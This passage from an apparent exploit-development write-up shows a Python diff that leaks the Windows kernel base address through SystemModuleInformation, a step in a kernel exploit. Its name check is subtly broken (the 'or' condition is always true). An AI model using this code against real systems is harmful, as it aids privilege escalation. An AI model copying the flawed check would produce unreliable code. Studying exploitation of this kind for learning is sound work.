@@ -96,6 +96,21 @@ def base():
     memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))
 
     print("[*] Result buffer contains {} SystemModuleInformation objects".format(str(handle_num.value)))
+    
+    sys_info = create_string_buffer(sys_info.raw[8:])
+
+    counter = 0
+    for x in range(handle_num.value):
+        tmp = SYSTEM_MODULE_INFORMATION()
+        tmp_si = create_string_buffer(sys_info[counter:counter + sizeof(tmp)])
+        memmove(addressof(tmp), tmp_si, sizeof(tmp))
+        if "ntoskrnl" or "ntkrnl" in tmp.ImageName:
+            img_name = tmp.ImageName.split("\\")[-1]
+            print("[*] Kernel Type: {}".format(img_name))
+            kernel_base = hex(tmp.ImageBase)[:-1]
+            print("[*] Kernel Base: {}".format(kernel_base))
+            return img_name, kernel_base
+        counter += sizeof(tmp)
 ```
 
 The primary difference here is going to be establishing a class for the `SYSTEM_MODULE_INFORMATION` structure. Its very similar to GradiusX's class in their exploit script; however, I changed the name of the last member so that it was more congruent with the FuzzySec's Powershell script. For more information about this struct, please see the [documenation I referenced throughout this bug class exploitation process](https://gist.github.com/jNizM/ddf02494cd78e743eed776ce6164758f).
